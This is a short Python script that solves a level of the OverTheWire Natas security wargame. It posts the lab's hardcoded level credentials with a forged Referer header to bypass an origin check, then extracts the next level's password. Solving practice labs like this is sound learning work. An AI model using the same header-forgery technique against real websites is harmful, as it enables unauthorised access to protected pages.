#!/usr/bin/env python

import requests
import re

url='http://natas4.natas.labs.overthewire.org'
 
username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ' 

referer = 'http://natas5.natas.labs.overthewire.org/'

req = requests.post(url, auth=(username,password), headers = {'referer': referer})

print(re.findall('natas5 is (.*)', req.text)[0])